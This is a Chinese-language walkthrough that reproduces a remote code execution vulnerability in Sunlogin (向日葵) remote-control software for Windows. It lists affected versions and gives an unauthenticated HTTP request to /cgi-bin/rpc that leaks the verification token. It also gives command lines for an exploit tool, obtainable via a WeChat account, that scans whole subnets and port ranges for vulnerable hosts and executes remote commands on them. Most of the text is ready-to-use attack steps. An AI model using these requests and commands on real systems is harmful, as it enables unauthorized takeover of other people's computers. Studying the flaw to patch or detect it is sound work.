1 漏洞介绍


上海贝锐信息科技股份有限公司的向日葵远控软件存在远程代码执行漏洞（CNVD-2022-10270/CNVD-2022-03672），影响Windows系统使用的个人版和简约版，攻击者可利用该漏洞获取服务器部分控制权。



2 影响范围




  • 向日葵个人版 for Windows <= V11.0.0.33                                   

  • 向日葵简约版 <= V1.0.1.43315（2021.12）



3 漏洞复现


复现环境：

Windows系统两台，我这里开虚拟机用Windows Server 2016作为被攻击主机，安装向日葵

物理机Windows 10 专业版作为攻击机，安装BurpSuite、ScanPort





首先本地主机开启ScanPort 扫描对目标主机做端口扫描，此漏洞端口一般来说端口会大于40000，由于我使用的靶机环境复杂开了太多的端口，如下图所示，需要一个个判断哪个才是向日葵的端口




我们可以一个个端口尝试，在浏览器中访问目标主机IP+端口                    

出现如下内容，则表示漏洞存在


{"success":false,"msg":"Verification failure"}



接下来使用BurpSuite抓包，往/cgi-bin/rpc接口构造如下请求包，可以在未授权下获取verify_string,即CID                             


POST /cgi-bin/rpc HTTP/1.1Host: 10.0.0.154:50163User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Length: 19
action=verify-haras

4 漏洞批量检查与利用




利用工具及复现工具环境，关注公众号，回复向日葵，即可获得链接             工具使用方法如下：





检测某目标是否存在漏洞                                               




xrkRcePro.exe -h 10.0.0.154

检测某网段是否存在漏洞：                                         



xrkRcePro.exe -h 10.0.0.0/24 -t scan




默认扫描全端口：1-65535，可以根据实际场景指定端口范围                                      



xrkRcePro.exe -h 10.0.0.154 -t scan -p 40000-60000



检测到目标及端口号存在漏洞，利用RCE工具远程执行命令                                     



xrkRcePro.exe -h 10.0.0.154 -t rce -p 50163 -c "whoami"
